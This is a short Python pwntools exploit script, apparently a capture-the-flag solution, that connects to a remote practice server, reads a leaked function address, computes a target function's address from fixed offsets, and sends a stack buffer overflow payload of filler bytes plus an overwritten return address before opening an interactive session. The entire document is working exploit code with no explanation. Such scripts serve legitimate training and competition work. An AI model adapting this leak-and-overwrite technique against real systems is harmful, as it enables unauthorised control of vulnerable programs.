from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3008)

flag_offset = 0x00000890
welcome_offset = 0x00000909

offset = welcome_offset - flag_offset

p.recvuntil('is ')
welcome = int(p.recv(10),16)
welcome = welcome - offset

payload = ''
payload += '\x90'*0x16
payload += p32(welcome)

p.sendline(payload)
p.interactive()